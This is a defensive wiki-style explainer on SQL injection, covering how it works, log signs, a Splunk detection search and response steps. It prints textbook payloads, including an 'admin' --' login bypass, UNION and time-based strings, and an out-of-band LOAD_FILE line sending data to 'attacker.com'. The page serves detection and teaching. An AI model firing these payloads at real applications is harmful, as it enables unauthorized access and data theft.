# SQL injection (SQLi)

!!! abstract "In one line"
    The attacker puts **SQL code into an input field** so the database runs it, letting them read, change or delete data, or bypass login.

| | |
|---|---|
| **MITRE ATT&CK** | [T1190 Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) |
| **OWASP** | A05:2025 Injection · CWE-89 |
| **Common tools** | sqlmap, Burp Suite |
| **Real example** | MOVEit Transfer (CVE-2023-34362) mass data theft started with SQL injection |

## How it works

The application builds a query by gluing user input into a string:

```sql
SELECT * FROM users WHERE username = '<input>' AND password = '<input>';
```

The attacker types this as the username:

```text
admin' --
```

The query becomes:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '...';
```

`--` starts a comment, so the password check disappears and the attacker logs in as `admin`.

## Types

| Type | How the attacker gets data back | Payload example |
|---|---|---|
| **Error-based** | Database error messages show data | `' AND 1=CONVERT(int, @@version)--` |
| **UNION-based** | Adds their own `SELECT` to the page's results | `' UNION SELECT username, password FROM users--` |
| **Boolean blind** | Page looks different for true vs false | `' AND 1=1--` vs `' AND 1=2--` |
| **Time-based blind** | Page is slow when the condition is true | `' AND SLEEP(5)--` (MySQL), `'; WAITFOR DELAY '0:0:5'--` (MSSQL) |
| **Out-of-band** | Database sends data to the attacker's server via DNS/HTTP | `LOAD_FILE('\\\\attacker.com\\x')` |

## What you see in logs

| Log source | What to look for |
|---|---|
| Web access log (after URL decoding) | `'`, `"`, `--`, `#`, `/*`, `OR 1=1`, `UNION SELECT`, `ORDER BY 10`, `information_schema`, `@@version`, `SLEEP(`, `WAITFOR DELAY`, `BENCHMARK(` |
| Web access log | User-Agent `sqlmap/x.x`; hundreds of requests to the same page with changing parameter values |
| Web access log | Bursts of **500** errors (broken queries), and **response sizes** that suddenly grow (data dumped) |
| Web access log | Response **time** around 5 or 10 seconds (time-based) |
| WAF | SQLi signature hits (also covers POST bodies) |
| Database logs | Queries against `information_schema` / `sys.tables`, errors, unusual `SELECT *` on user tables |

## How to detect it

- SQL keywords and quote characters in parameters.
- One IP producing many 500s on the same endpoint.
- A successful (200) response much larger than normal after many probing requests.

```spl title="Example Splunk search"
index=web
| eval decoded=urldecode(uri_query)
| where match(decoded, "(?i)(union\s+select|or\s+1=1|information_schema|sleep\(|waitfor\s+delay|@@version)")
| stats count, values(status) as status, max(bytes) as max_bytes by src_ip, uri_path, http_user_agent
```

## How to respond

1. **Did it succeed?** Look for 200s with large responses, data patterns in responses (if logged), DB query logs.
2. If yes: find **what data** was read (which tables) — this may be a reportable data breach. Check for new admin accounts or changed data.
3. **Block** the source IP, add/enable WAF rules.
4. **Fix the code:** **parameterized queries / prepared statements** (the real fix), input validation, least-privilege database account, no detailed error messages to users.

## References

- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP: SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
